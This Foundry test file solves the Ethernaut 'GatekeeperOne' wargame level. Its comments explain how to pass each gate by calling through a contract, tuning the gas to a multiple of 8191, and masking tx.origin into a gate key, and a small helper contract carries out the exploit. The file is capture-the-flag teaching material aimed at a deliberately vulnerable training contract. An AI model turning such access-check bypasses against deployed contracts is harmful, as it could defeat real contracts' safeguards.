// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";

import "../levels/13-GatekeeperOne/GatekeeperOneFactory.sol";
import "../core/Ethernaut.sol";

contract GatekeeperOneTest is Test {
    Ethernaut ethernaut;
    address attacker = makeAddr("attacker");

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testGatekeeperOneHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        GatekeeperOneFactory gatekeeperOneFactory = new GatekeeperOneFactory();
        ethernaut.registerLevel(gatekeeperOneFactory);
        vm.startPrank(attacker, attacker); // origin has its importance in this challenge
        address levelAddress = ethernaut.createLevelInstance(gatekeeperOneFactory);
        GatekeeperOne ethernautGatekeeperOne = GatekeeperOne(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // The goal here is to pass all the gates with requires
        //
        // first: msg.sender != tx.origin
        // hence the call cannot come from an EOA directly, it needs to be a contract
        // calling the GatekeeperOne contract
        //
        // second: gasleft() % 8191 == 0
        // gas sent with the call needs to be a multiplicator of 8191
        // for this, it is needed to know how much gas is consumed between the call and the require
        // It will depends on solidity version and compiler option. In the current case,
        // using forge debug, allow to exactly know how much gas is used between those statement
        // forge test --debug testGatekeeperOneHack and skip through the calls
        // Other solution, involve looping with a try catch, there are several writups that can be found
        //
        // third: the 3 requires
        // It is needed to take into account that EVM use big-endian byte ordering and
        // how solidity handles conversions. With big-endian most significant bytes will be stored first
        // 1. uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
        // 2. uint32(uint64(_gateKey)) != uint64(_gateKey)
        // 3. uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
        //
        // 1._gateKey is 8 bytes so 0xXXXXXXXXXXXXXXXX
        // by casting to uint32 on one side and uint16 on the other side
        // the least 4 significant bytes needs to be equal to the last 2 significant bytes
        // so 0xXXXXXXXX == 0xXXXX
        // Hence, it needs to masked with 0x0000FFFF
        // 2. with the second require, the 4 least significant bytes need to be different than
        // the 8 least significant bytes
        // so 0xXXXXXXXX != 0xXXXXXXXXXXXXXXXX
        // hence 0xFFFFFFFF00000000 is the second part of the bit mask
        // by taking into account the first requirement, it will be 0xFFFFFFFF0000FFFF
        // The last one gives us a hint on which value to use
        // tx.origin: the EOA address initiating the transaction hence the attacker

        GatekeeperOneCaller gatekeeperOneCaller = new GatekeeperOneCaller(address(ethernautGatekeeperOne), attacker);
        gatekeeperOneCaller.enter();

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract GatekeeperOneCaller {
    address gatekeeperOne;
    address attacker;

    constructor(address _gatekeeperOne, address _attacker) {
        require(_gatekeeperOne.code.length > 0, "Not a contract");
        gatekeeperOne = _gatekeeperOne;
        attacker = _attacker;
    }

    function enter() external {
        bytes8 mask = 0xFFFFFFFF0000FFFF;
        bytes8 gateKey = bytes8(uint64(uint160(attacker))) & mask;
        gatekeeperOne.call{gas: 8191 * 3 + 268}(abi.encodeCall(GatekeeperOne.enter, (gateKey)));
    }
}
